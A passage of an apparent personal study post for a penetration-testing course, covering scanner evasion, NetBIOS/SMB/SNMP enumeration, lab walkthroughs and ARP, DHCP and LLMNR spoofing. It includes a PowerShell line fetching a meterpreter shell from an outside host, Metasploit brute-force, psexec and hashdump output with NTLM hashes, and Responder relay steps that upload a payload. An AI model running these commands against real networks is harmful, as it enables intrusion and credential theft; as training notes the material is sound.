<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	--spoof-mac apple/dell/etc = specify a vendor mac
	--spoof-mac 0 = specify a random mac
	--spoof-mac 00:11:22:33:44:55 = fixed mac
</code></pre></div></div>

<h3 id="random-host">Random Host</h3>
<p>nmap</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	mkdir host.list &gt; insert some hosts
	// -iL host.list (use host of file) 
	// --randomize-hosts (host sequence scan is random)
</code></pre></div></div>

<p>hping</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	--rand-dest 192.168.2.x
	-I &lt;interface&gt;
	-i u10 ( add 10 microseconds of delay between scans)
</code></pre></div></div>

<blockquote>
  <p>more information about bypassing firewall / IDS
http://nmap.org/book/man-bypass-firewalls-ids.html</p>
</blockquote>

<h1 id="enumeration">Enumeration</h1>

<h2 id="netbios">NetBIOS</h2>
<p>The main purpose of NetBIOS is to allow application on different systems to communicate with one another over the LAN.
its used For sharing printers and files, remote procedure calls, exchange messages and more.
these features may reveal additional information such as computer names, usernames, domains, printers, shares</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>udp 137 - name services
udp 138 - datagram services
tcp 139 - session services
</code></pre></div></div>

<h3 id="name-service">Name service:</h3>
<p>works like a DNS record
https://technet.microsoft.com/en-us/library/cc738412(v=ws.10).aspx</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>16 byte = characters &gt; 15 can be specified &gt; last 1 = resource type 00 to FF (hexa)
</code></pre></div></div>

<p>show the netbios names:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtstat -n
</code></pre></div></div>

<p>Windows Internet Name Service (WINS) - the service that maps netbios to ip address
https://technet.microsoft.com/en-us/library/cc725802.aspx
https://technet.microsoft.com/en-us/library/cc784180(v=ws.10).aspx
https://technet.microsoft.com/en-us/library/cc784707(v=ws.10).aspx</p>

<h3 id="datagram-service">Datagram service</h3>
<p>NetBIOS Datagram Service (NBDS) permits the sending of messages to a NetBIOS name.
datagram and broadcast methods 
udp
no error detection / correction</p>

<blockquote>
  <p>NetBIOS Session Service (NBSS) allows 2 names to establish a connection in order to exchange data.</p>
</blockquote>

<h2 id="smb---server-message-block">SMB - Server Message Block</h2>
<p>share files, disks, directories, printer, even COM ports across a network
before windows 2000 SMB ran only with NetBIOS over TCP/IP port 139
After windows 2000, we can run SMB direcly over TCP, through port 445.</p>

<h3 id="nbtstat">Nbtstat</h3>
<p>windows:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="n">nbtstat</span><span class="w"> </span><span class="nt">-A</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gather</span><span class="w"> </span><span class="nx">information</span><span class="w">
</span></code></pre></div></div>

<p>linux:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	nbtscan <span class="nt">-v</span> &lt;ip&gt;
	nmblookup <span class="nt">-A</span> &lt;ip&gt;
</code></pre></div></div>

<h3 id="net-command">Net command</h3>
<p>https://technet.microsoft.com/en-us/library/hh875576.aspx
Net view allow us to list domains, computers and resources shared by a computer in the network.
win:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">K:</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">\C</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">map</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">C:</span><span class="w"> </span><span class="nx">driver</span><span class="w">
</span></code></pre></div></div>

<p>linux:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
	smbclient <span class="nt">-L</span> &lt;ip&gt;
	smbclient <span class="se">\\\\</span>&lt;ip&gt;<span class="se">\\</span>&lt;share&gt;
	<span class="nb">sudo </span>mount.cifs //&lt;ip&gt;/C /media/K_share/ <span class="nv">user</span><span class="o">=</span>,pass<span class="o">=</span>
	
</code></pre></div></div>

<blockquote>
  <p>IPC$ = Inter-Process Communication - Can be used to leverage null session attacks</p>
</blockquote>

<h3 id="null-session">Null Session</h3>
<p>Rely on Common Internet File System (CIFS) and Server Message Block (SMB) API, that return information even to an unauthenticated user.
A malicious user can establish a connection to a Windows system without provinding any username or password. A connection must be established to the administrative share name IPC.</p>

<p>win:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="nx">\IPC</span><span class="err">$</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nx">/u:</span><span class="s2">""</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://10.90.60.80:5923/shell_meterpreter.php'</span><span class="p">,</span><span class="s1">'C:\test.php'</span><span class="p">)</span><span class="w">
</span></code></pre></div></div>

<h3 id="tools-1">Tools</h3>
<p>win:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Winfingerprint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="nx">GUI</span><span class="w">
</span><span class="n">winfo</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-n</span><span class="w"> 
</span><span class="n">DumpSec</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">select</span><span class="w"> </span><span class="nx">computer</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">ip</span><span class="w">
</span><span class="n">//</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dump</span><span class="w"> </span><span class="nx">Users</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">column</span><span class="w">
</span></code></pre></div></div>

<p>linux:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	enum4linux &lt;ip&gt;
	//mv polenum.py /usr/bin
	// <span class="nb">install </span>ldapscripts
	// <span class="nt">-a</span> <span class="o">=</span> full scan

	rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> &lt;ip&gt;
	<span class="o">&gt;</span> enumdomusers
	<span class="o">&gt;</span> enumalsgroups
	<span class="o">&gt;</span> srvinfo
	<span class="o">&gt;</span> lookupnames
	<span class="o">&gt;</span> queryuser
	<span class="o">&gt;</span> enumprivs
</code></pre></div></div>

<h4 id="sid2userexe">sid2user.exe</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sid2user.exe \\share &lt;sid&gt;
</code></pre></div></div>

<p>replace the <strong>-</strong> with spaces.
sid can be found with Winfingerprint if you are in windows
then we add <value> to see info about users
500 = administrator, 1000 = HelpAssistant</value></p>

<blockquote>
  <p>general tip: execute before starting metasploit</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemctl <span class="nb">enable </span>postgresql
msfdb init
</code></pre></div></div>

<h2 id="snmp">SNMP</h2>
<p>Simple Network Management Protocol
used For exchanging management information between network devices
can also be used to configure a router or simply check its status</p>

<h3 id="commands">Commands</h3>
<p>Read = monitor devices
Write = configure devices and change device settings
Trap = trap events from the device and report them back to the monitoring system
Traversal Operations = determine what variables a certain device supports</p>

<h3 id="version">Version</h3>
<p>SNMPv1 = most vulnerable
SNMPv3 = has encryption, but can be bruteforced</p>

<h3 id="type-of-attacks">Type of Attacks</h3>
<ul>
  <li>Flooding:
DOS attack which involves spoofing an SNMP agent and floosing the SNMP trap management with tens of thousands of SNMP traps, varying in size from 50 bytes to 32 kilobytes, until the SNMP management trap is unable to function properly.</li>
  <li>Community:
Using Default community strings to gain privileged access to systems</li>
  <li>
    <p>Brute force:
Using a tool to guess the community strings used on a system to achieve elevated privileges.</p>
  </li>
  <li>Obtaining the Community Strings
Sniff the network traffic 
dictionary attack  // even tho nowadays IDS will alert this activity as suspicious</li>
</ul>

<h3 id="tools-2">Tools</h3>
<p>SnmpWalk = http://www.net-snmp.org/docs/man/snmpwalk.html</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpwalk -v 2c &lt;ip&gt; -c public
-v = version
-c = community string
if the output returns the OID numerically: install snmp-mibs-downloader &gt; 
then comment the fourth line /etc/snmp/snmp.conf #mibs :
hrSWInstalledName
hrMemorySize
</code></pre></div></div>

<blockquote>
  <p>more info: http://www.net-snmp.org/wiki/index.php/TUT:snmpwalk</p>
</blockquote>

<p>SnmpSet = http://www.net-snmp.org/docs/man/snmpset.html
the SET operation allows either the management application or, the manager, to set the value of an attribute (of a managed object) in the agent.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmpwalk -v 2c -c public &lt;ip&gt; sysContact
// SNMPv2-MIB::sysContact.0 = STRING: admin@els.com
snmpset -v 2c -c public &lt;ip&gt; sysContact.0 s new@els.com
// SNMPv2-MIB::sysContact.0 = STRING: new@els.com
</code></pre></div></div>

<p>SnmpEnum = http://dl.packetstormsecurity.net/UNIX/scanners/snmpenum.zip
dos2unix *.txt</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">perl</span> <span class="nv">snmpenum</span><span class="o">.</span><span class="nv">pl</span> <span class="mf">10.10.10.5</span> <span class="nv">public</span> <span class="nv">windows</span><span class="o">.</span><span class="nv">txt</span>
</code></pre></div></div>

<h3 id="nmap---snmp-script">NMAP - SNMP Script</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sU -p 161 --script=&lt;script&gt; &lt;target ip&gt;
</code></pre></div></div>

<p>useful scripts: /usr/share/nmap/scripts</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snmp-brute
snmp-info
snmp-interfaces
snmp-netstat
snmp-processes
snmp-sysdescr
snmp-win32-services
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--script snmp-brute = to find  the community strings
</code></pre></div></div>

<p>we can add: to use a better wordlist</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--script-args snmp-brute.communitiesdb=&lt;wordlist&gt;
</code></pre></div></div>

<p>https://github.com/danielmiessler/SecLists</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sU -p 161 --script snmp-win32-users 10.10.10.5
nmap -sU -p 161 --script snmp-* 10.10.10.5 -oG snmp.txt
</code></pre></div></div>

<h2 id="lab-netbios">Lab NetBios</h2>
<p>my ip: 172.16.10.5</p>

<p>public ip &gt; 10.130.40.70
organization network: 172.30.111.0/24</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole &gt; smb_login 
bruteforce to get credential
</code></pre></div></div>

<p>ELS-WIN7
administrator:password</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole &gt; psexec 

	run autoroute -s 172.30.111.0/24
	ctrl+z
use auxiliary/scanner/portscan/tcp
	port 139,445
	threads 10
	rhost &lt;172.30.111.0/24&gt;
	run
172.30.111.10 &gt; 139,445 open
</code></pre></div></div>

<blockquote>
  <p>back to the meterpreter session
use incognito
list_tokens -u
impersonate_token administrator
background session</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) &gt; run

[-] 172.30.111.10:139     - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet
[*] 172.30.111.10:445     - Windows XP Service Pack 3 (English)
[+] 172.30.111.10:445     - My Documents - (DISK) 
[+] 172.30.111.10:445     - IPC$ - (IPC) Remote IPC
[+] 172.30.111.10:445     - C - (DISK) 
[+] 172.30.111.10:445     - ADMIN$ - (DISK) Remote Admin
[+] 172.30.111.10:445     - C$ - (DISK) Default share
[+] 172.30.111.10:445     - FooComShare - (DISK) 
[*] 172.30.111.10:        - Scanned 1 of 1 hosts (100% complete)
</code></pre></div></div>

<p>get back to shell</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use K: \\172.30.111.10\FooComShare
K:
dir
</code></pre></div></div>

<ul>
  <li>background terminal</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; download K:\\ Target -r
</code></pre></div></div>

<blockquote>
  <p>we now download the files from the share through another network
This is more than prove that the network is vulnerable</p>
</blockquote>

<h2 id="lab-snmp">Lab SNMP</h2>
<p>internal pentest
myip: 10.10.10.205</p>

<p>target network: 10.10.10.0/24</p>

<p>hosts:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.5
	161 - u //snmp runs in this port [161]
		public
		private
161/udp open  snmp
|--script snmp-win32-users: 
|   Administrator
|   Guest
|_  admin
</code></pre></div></div>

<p>10.10.10.20</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	139 - t
	445 - t
	137 - u
	1026 - u
</code></pre></div></div>

<blockquote>
  <p>After getting users from 10.10.10.5
we can try bruteforce // with nmap -sU -p161 <target ip=""> --script snmp-brute
but 10.10.10.5 does not have tcp ports opened, 
so we can try to bruteforce 10.10.10.20 with the same users we found.</target></p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- we can run nmap -sU -p161 &lt;target&gt; snmp-* &gt; snmp_output
</code></pre></div></div>

<blockquote>
  <p>after getting the users in the snmp-win32-users
we can bruteforce with hydra 
then, msfconsole &gt; psexec
set options &gt; run
we have a session &gt; grab the flag &gt; its done</p>
</blockquote>

<blockquote>
  <p>I tried with Hydra, it has error -.-
running with metasploit, smb_login bruteforce
its so slow… I hate to wait scans, my pc is weak.</p>
</blockquote>

<p>anyway: 
admin:a1b2c3d4</p>

<ul>
  <li>run psexec in metasploit with these credentials:
we have authority\system</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; run hashdump 

Administrator:500:0ffe87453383d68c695109ab020e401c:bcdbcc55cca6b509c5bf0c38757bb3eb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
german:1002:aad3b435b51404eeaad3b435b51404ee:0a0f8ee7df8e26714d91e399a0a8fc33:::
user04:1006:633c097a37b26c0caad3b435b51404ee:f2477a144dff4f216ab81f2ac3e3207d:::
admin:1007:db170c426eae78beff17365faf1ffe89:482563f0adaac6ca60c960c0199559d2:::
</code></pre></div></div>

<h1 id="sniffing--mitm-attacks">Sniffing &amp; MitM Attacks</h1>

<h2 id="overview-1">Overview</h2>
<h3 id="passive-sniffing">Passive Sniffing</h3>
<p>watching packets on a network in order to gather sensitive information such as userids, passwords, and other sensitive information.
you just need a sniffer, such as Wireshark.</p>

<h3 id="active-sniffing">Active Sniffing</h3>
<p>performing malicious operations (MAC flooding or ARP poisoning) on the network.
This means that we will inject packets on the network in order to redirect the traffic.
Is not a stealthy technique</p>

<h3 id="mac-flooding">MAC Flooding</h3>
<p>stress the switch and fill its CAM table
A CAM table keeps all the info required to forward frames to the correct port:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;MAC address - port number - TTL&gt;
</code></pre></div></div>

<blockquote>
  <p>When the space in the CAM is filled with fake MAC addresses, the switch cannot learn new MAC addresses. The only way to keep the network alive is to forward the frames meant to be delivered to the unknown MAC address on all the ports of the switch, thus making it fail open, or act like a hub.</p>
</blockquote>

<h3 id="arp-poisoning-aka-arp-spoofing">ARP Poisoning (aka arp spoofing)</h3>
<p>stealthiest among the active sniffing
The attacker is able to redirect the traffic of the selected victims to a specific machine. Doing this will enable the attacker to not only monitor, but also modify the traffic.
mainly mount a MitM attack, it can be used to DoS the network.</p>

<h2 id="arp-concepts">ARP Concepts</h2>
<p>Address Resolution Protocol
its supported by all NICs and OS.
its a quick way to match Layer 3 network (IP address) with Layer 2 (MAC addresses)</p>

<h1 id="arp-protocol">Arp Protocol</h1>
<p>ARP request
ARP reply</p>

<p>ARP table &gt; stores the IP-MAC pairs and TTL value (time to live) related to each entry
win:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp -a
</code></pre></div></div>

<p>lin:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp
</code></pre></div></div>

<h3 id="example">Example</h3>
<p>if a host-A need to send a packet to host-B, it will first check in his ARP table if it has the IP-MAC pair of host-B.
if the entry is not found, an ARP request is sent on the LAN (broadcast).
The request contains:
source ip address: IP_A
source mac address: MAC_A
destination ip: IP_B
destination mac: FF:FF:FF:FF:FF:FF</p>

<p>The nodes whose IP address does not match with the destination IP_B will just drop the packet
The correspondent node will respond with ARP reply:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>destination ip: IP_A
destination mac: MAC_A
source ip address: IP_B
source mac address: MAC_B
</code></pre></div></div>

<blockquote>
  <p>After receiving the ARP reply, the arp table of host A will be updated For later use.</p>
</blockquote>

<ul>
  <li>So ARP is used:
a host wants to send a packet to another host in the same network
a host desires to reach another host beyong his local network and needs the gateway hardware address
a router needs to forward a packet For one host through another router
a router needs to forward a packet to the destination host on the same network</li>
</ul>

<h3 id="gratuitous-arp">Gratuitous ARP</h3>
<p>its when a request are set with ip-mac, ip is the machine that is issuing the packet and the mac is the broadcast address
and reply: that has been sent without being requested</p>

<blockquote>
  <p>Its useful to detect IP conflict or simply inform other hosts/switches of a MAC address in the network, an attacker can use these packets to mount ARP poisoning attacks.</p>
</blockquote>

<h2 id="2-main-ways-to-arp-poisoning">2 main ways to ARP poisoning</h2>

<h3 id="host-poisoning">Host Poisoning</h3>
<p>create a MitM between hosts, forge Gratuitous ARP reply packets and send to both of the hosts
All the traffic from B to A and from A to B will pass through the attacker.
The attacker must be able to forward the packets quickly to keep the system administrator from suspecting anything</p>

<h3 id="gateway-poisoning">Gateway Poisoning</h3>
<p>attacker will send Gratuitous ARP replys to some or all the hosts in a network, annoucing his MAC address as the MAc address of the default gateway For the network.
Then the attacker can forward the packets to the real gateway.
Unintentional DoS can occur in the network if the attacker is too slow forwading the packets</p>

<h2 id="sniffing-tools">Sniffing Tools</h2>

<h3 id="dsniff-suite">Dsniff suite</h3>
<p>http://www.monkey.org/~dugsong/dsniff/</p>

<p>collection of tools active/passive sniffing
MITM attacks
monitor the network For sensitive data</p>

<blockquote>
  <p>u can also feed dsniff with pcap (packet capture) from wireshark</p>
</blockquote>

<ul>
  <li>the package also contains the following tools:</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>Passive</td>
      <td>Active</td>
      <td>MITM</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>FileSnarf</td>
      <td>ArpSpoof</td>
      <td>SshMITM</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>MailSnarf</td>
      <td>DnsSpoof</td>
      <td>WebMITM</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>MsgSnarf</td>
      <td>Macof</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>URLSnarf</td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>WebSpy</td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h3 id="wireshark-1">WireShark</h3>
<p>Select the interface
capture options &gt; save file [ eth0_packet_capture_http ]
select the filter &gt; tcp port http
<strong>http.authbasic</strong> = list all the packets containing credentials sent to the application
study packets
we can right click and <strong>show packet in a new window</strong>
look For the major heading names Hypertext Transfer Protocol
open the child node named : **Authorization: Basic <string>**
Here we can find the credentials used For the authentication</string></p>

<h3 id="tcpdump">TcpDump</h3>
<blockquote>
  <p>tcpdump is a powerfull tool, because we can use sideways with bash script
scan and view with grep, and so on…</p>
</blockquote>

<p>http://www.tcpdump.org/</p>

<ul>
  <li>tcpdump <options> <filter expression="">
```
sudo tcpdump -i eth0
-xxAXXSs 0 dst <ip>
-dst = destination
-A = print each packet in ASCII. good For web pages
-XX = print the headers in hex and ASCII</ip></filter></options></li>
  <li>xx = print headers in hex
-S = print absolute, rather than relative, TCP sequence numbers
-s = snarf bytes of data from each packet. adequate For IP, ICMP, TCP and UDP</li>
</ul>

<p>sudo tcpdump -i eth0 -vvvASs 0 dst <ip></ip></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
&gt; we can also capture the authorization header with the credentials, but the difference is that wireshark automatically decodes the base64 text, tcpdump we will need to do this manually

</code></pre></div></div>
<p>sudo tcpdump -i eth0 host <website or="" ip="">
sudo tcpdump -i eth0 src  <source ip="" /> dst <destine ip="">
sudo tcpdump -i eth0 -F <file with="" ips="">
sudo tcpdump -i eth0 -c <count many="" packets="" u="" wanna="" see="">
sudo tcpdump -i eth0 -w <write output="" file="">
sudo tcpdump -i eth0 -r <read file="" of="" packets="" captures=""></read></write></count></file></destine></website></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>


&gt; tcpdump For windows = https://www.winpcap.org/windump/


## Main-in-The-Middle (MITM) Attacks

### ARP Poisoning
This attack leaves the MAC address of the attacker in the ARP cache of the victims
Another gratuitous ARP with correct values would restore the correct values after the sniffing is completed.
Countermeasures:
using Static ARP is not a feasible approach into large and always changing networks.
Tools like arpwatch or arpcop can detect not stop such attacks.

### Local to Remote MITM
When a host in a LAN wants to send packets to hosts outside the LAN it uses the default gateway
The ARP poisoning in this scenario leads to a MITM attack from local to remote

### DHCP Spoofing
attacker can spoof the DHCP messages in order to mount a MITM attack. 
1. A New host is connected to the network: it sends a DHCP Discovery broadcast packet using UDP on port 67. Since the host still needs an IP to be assigned, the source address of the packet is 0.0.0.0


→ DHCPDISCOVER

</code></pre></div></div>
<p>src ip = 0.0.0.0
dst ip = 255.255.255.255
mac src = aaa
mac dst = fff</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
→ DHCPOFFER (the answer from dhcp server)

</code></pre></div></div>
<p>YIADDR = &lt; ip from dhcp &gt; // ‘Your IP Address’
Lease time = 3600 // in seconds - defines the validity period of the offered IP
src ip = dhcp server ip
dst ip = 255.255.255.255 // the destination is still a broadcast
mac src = router mac
mac dst = fff</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

→ DHCPREQUEST (the client responds with another broadcast packet)

</code></pre></div></div>
<p>src ip = 0.0.0.0 // the source is still 0.0.0.0 since it has not received a verification from the server
dst ip = 255.255.255.255 //still broadcast
dhcp: request address = <ip from="" dhcp=""></ip></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

→ DHCPACK
</code></pre></div></div>
<p>YIADDR = <ip from="" dhcp=""> // the given ip
src ip = dhcp ip 
dst ip = 255.255.255.255 // broadcast 
CHADDR = aaaa // client ethernet address = mac address</ip></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
&gt; DHCP clients choose the best offer according to the lease time attribute in the DHCP offer: the longer the better.
This packet is used to designate a winner between all the DHCP servers.

 
- What we have to do is send our DHCP OFFER with a greater lease time. This will lure the victim to choose our offer and then set the configurations we will send.

→ DHCPOFFER (the answer from dhcp server)

</code></pre></div></div>
<p>YIADDR = &lt; ip from fake-dhcp &gt; // ‘Your IP Address’
Lease time = 10000 // in seconds - defines the validity period of the offered IP
src ip = attacker dhcp server ip
dst ip = 255.255.255.255 // the destination is still a broadcast
mac src = rouge_mac
mac dst = fff</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>


&gt; DHCP servers not only offerIP addresses but they can also provide a default gateway For the network.
By competing with legit DHCP servers (and winning by increasing the lease time), we can set ourselves as the default gateway.


### MITM in Public Key Exchange
- hijack the delivery of a public key into an asymmetric key encryption communication.
- the asymmetric encryption is based on private/public key.

1. Alice queries the Key server For Bobs public key
2. The Key Server returns Bobs public key to Alice
3. Alice encrypts her message using Bobs public key and sends the message to Bob

&gt;  The MITM must be able to sniff traffic on Alices network or on the Key Server network (through ARP poisoning, DHCP snooping, etc)

#### Attack
1. Intercept Alices query and forward it to the Keys Servers
2. Intercept Bobs public key and store it For further use
3. Send his own Public Key to Alice instead of Bobs public key
4. Alice would encrypt data using Attacker Public Key thinking that she is using Bobs key
5. MITM would intercept Alices encrypted messages, decrypting them with his private key and then forward them to Bob using Bobs public key saved at step 2


### LLMNR and NBT-NS Spoofing / Poisoning
- LLMNR = Link-Local Multicast Name Resolution
- NBT-NS = NetBIOS Name Service
Effective methods For capturing users NTLMv1, NTLMv2 or LM (Lan Manager) hashes through MITM type of attack.
LLMNR is the sucessor to NBT-NS and was instroduced in Windows Vista.

&gt; both allow machines within a Windows-based network to find one another and is essentially a **Fall-back** protocol used For the resolution of hostnames within a network when resolving of hostnames via DNS fails.
the hashes are sent through the network, offering an attacker on the same network segment the opportunity to intercept.

### A scenario of attacking LLMNR or NBT-NS
1. Host-A requests an SMB share at the system **\\intranet\files**, but instead of typing **intranet** mistakenly types **intranet**.
2. Since **intranet** cant be resolved by DNS as it is an unkown host, Host-A then falls back to sending an LLMNR or NBT-NS broadcast message asking the LAn For the IP address For Host **Intrnet**
3. An attacker, (Host-B) responds to this broadcast message claiming to be the **intrnet** system
4. Host-A complies and sends Host-B (attacker) their username and NTLMv1 or v2 hash.

### Responder / MultiRelay
	https://github.com/lgandx/Responder
	https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py

   → Responder works by listening For LLMNR or NBT-NS broadcast messages, and spoofing responses to targeted hosts, resulting in intercepting hashes we can either pass (relay) to other systems, or crack offline.
   → MultiRelay will be responsible For relaying the hashes to other machines on the LAN and can provide us with a MultiRelay shell if successfull.

&gt; To this attack to work, 'SMB signing must be disabled' in the target.
we can check with RunFinger.py (https://github.com/lgandx/Responder/blob/master/tools/RunFinger.py) which is included with Responder toolkit.

```python
	python RunFinger.py -i &lt;target ip&gt;
</code></pre></div></div>

<h4 id="attack">Attack</h4>
<p>Modify the Responder.conf:
disable the <strong>SMB</strong> and <strong>HTTP</strong> by setting the values to <strong>Off</strong></p>

<p>Launch Responder.py:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="n">Responder</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">I</span> <span class="n">eth0</span> <span class="o">--</span><span class="n">lm</span> 
<span class="o">-</span><span class="n">I</span> <span class="o">=</span> <span class="n">interface</span>
</code></pre></div></div>

<p>Launch MultiRelay.py (in another tab):</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="n">MultiRelay</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">t</span> <span class="o">&lt;</span><span class="n">target</span> <span class="n">ip</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">u</span> <span class="n">ALL</span>
<span class="o">-</span><span class="n">u</span> <span class="o">=</span> <span class="n">user</span> <span class="o">//</span> <span class="o">-</span><span class="n">t</span> <span class="o">=</span><span class="n">target</span>
</code></pre></div></div>

<blockquote>
  <p>with the multiRelay shell we can upload files
 upload /root/data/payload.exe = path of our file
 C:\windows\temp\payload.exe  = the file is save in this path</p>
</blockquote>

<blockquote>
  <p>we can gain meterpreter shell
 then load kiwi
 creds_all</p>
</blockquote>

<p>LLMNR / NBT-NS Poisoning</p>

<p><img src="/assets/images/posts/2023-11-19-ecppt/20.png" alt="Alt text" class="align-center" /></p>

<h2 id="attacking-tools">Attacking Tools</h2>

<h3 id="ettercap">Ettercap</h3>
<p>Ettercap is an open source program that combines a packet sniffer For differents protocols, but it also offers password cracking features.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ettercap -G
-G = graphical interface
</code></pre></div></div>

<p>select the sniffing option:
	Unified: it sniffs all the packets on the cable
	Bridged: it uses two network interfaces and forwards the traffic from one to the other
select the interface:
	tap0 in this case</p>

<p>The first step:
	find alive hosts
	Hosts &gt; Scan For Hosts
	Here we can select which of the hosts gonna be our targets
	click <strong>Add to Target 1</strong> and <strong>Add to Target 2</strong></p>

<blockquote>
  <p>Supposing we want to intercept only the traffic of a specific host, we will add the target host and the router in the list.
example:
	Add to target 1 : 172.16.5.15 // host
	Add to target 2 : 172.16.5.1   // route</p>
</blockquote>

<ul>
  <li>
